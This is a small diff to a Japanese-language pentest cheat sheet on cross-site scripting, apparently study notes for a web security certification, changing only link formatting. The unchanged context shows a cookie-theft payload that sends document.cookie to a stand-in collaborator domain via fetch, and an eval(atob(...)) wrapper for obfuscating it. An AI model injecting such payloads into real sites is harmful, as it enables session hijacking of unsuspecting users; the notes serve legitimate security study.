@@ -1,5 +1,5 @@
 
-- [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 ##### Cookie窃取用スクリプト基本形
 
@@ -19,7 +19,6 @@ fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
 eval(atob("base64エンコードした上記2つのペイロード"))
 ```
 [Web攻撃の難読化](../../../OSCP/Cheatsheet/Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md#base64%20encoding)
-[🔍 Recon](../../../BSCP/cheatsheet/🔍%20Recon.md#⭐️URLエンコードについて)
 
 ---
 ### 基本形
